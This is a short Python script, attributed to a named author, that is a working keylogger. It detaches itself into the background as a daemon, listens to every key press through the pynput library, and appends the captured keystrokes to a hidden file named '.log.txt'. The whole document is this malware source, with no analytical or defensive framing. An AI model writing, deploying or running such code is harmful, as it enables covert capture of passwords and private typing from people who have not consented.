#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# Andre Augusto Giannotti Scota (https://sites.google.com/view/a2gs/)

from os import fork, umask, setsid, chdir
from sys import exit
from pynput.keyboard import Key, Listener

kbuf = ""

def d():
	if fork() > 0:
		exit(0)

	chdir('./')
	setsid()
	umask(0)

def kp(k):
	global kbuf

	if k == Key.enter or k == Key.tab or k == Key.space:
		wl()
		kbuf = ""

	kbuf += str(k)

def wl():
	global kbuf
	f = open('.log.txt', 'a')
	f.write(kbuf)
	f.close()

d()

with Listener(on_press = kp) as listener:
	listener.join()
